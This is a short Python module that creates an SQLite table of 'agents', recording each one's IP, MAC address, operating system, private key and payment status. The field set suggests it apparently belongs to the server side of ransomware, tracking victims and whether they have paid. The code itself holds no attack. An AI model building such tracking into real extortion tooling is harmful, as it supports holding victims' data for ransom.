import sqlite3
import os

DB_PATH = os.path.join(os.path.dirname(__file__), 'agents.db')

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS agents (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT NOT NULL,
            mac TEXT NOT NULL,
            so TEXT NOT NULL,
            private_key TEXT NOT NULL,
            pay_status BOOLEAN NOT NULL DEFAULT FALSE
        )
    ''')
    conn.commit()
    conn.close()

def get_db_connection():
    return sqlite3.connect(DB_PATH)